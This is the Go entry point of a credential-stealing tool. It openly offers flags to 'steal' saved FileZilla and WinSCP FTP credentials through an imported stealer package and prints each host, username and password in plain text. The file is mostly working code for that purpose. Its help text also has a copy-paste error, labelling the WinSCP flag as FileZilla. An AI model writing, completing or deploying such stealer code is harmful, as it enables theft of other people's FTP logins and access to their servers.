package main

import (
	"flag"
	"fmt"
	"strconv"

	"github.com/krosshykes/stealer/ftp"
)

func main() {
	var (
		creds     []ftp.Creds
		fileZilla bool
		winSCP    bool
		i         int
	)
	flag.BoolVar(&fileZilla, "f", false, "Steal FileZilla FTP Credentials")
	flag.BoolVar(&winSCP, "w", false, "Steal FileZilla FTP Credentials")
	flag.Parse()
	if !fileZilla && !winSCP {
		fmt.Println("Usage:")
		fmt.Println("go run main.go -f true // to steal FileZilla FTP Creds")
		fmt.Println("go run main.go -w true // to steal WinSCP FTP Creds")
	}
	if fileZilla {
		cred, err := ftp.FilezillaCreds()
		if err != nil {
			fmt.Println(err)
		} else {
			creds = append(creds, cred)
		}
	}
	if winSCP {
		cred, err := ftp.WinSCPCreds()
		if err != nil {
			fmt.Println(err)
		} else {
			creds = append(creds, cred)
		}
	}
	for i = 0; i < len(creds); i++ {
		op := "Host:\t\t" + creds[i].Host + "\n"
		op += "Port:\t\t" + strconv.Itoa(creds[i].Port) + "\n"
		op += "User:\t\t" + creds[i].Username + "\n"
		op += "Password:\t" + creds[i].Password + "\n"
		fmt.Println(op)
	}
}
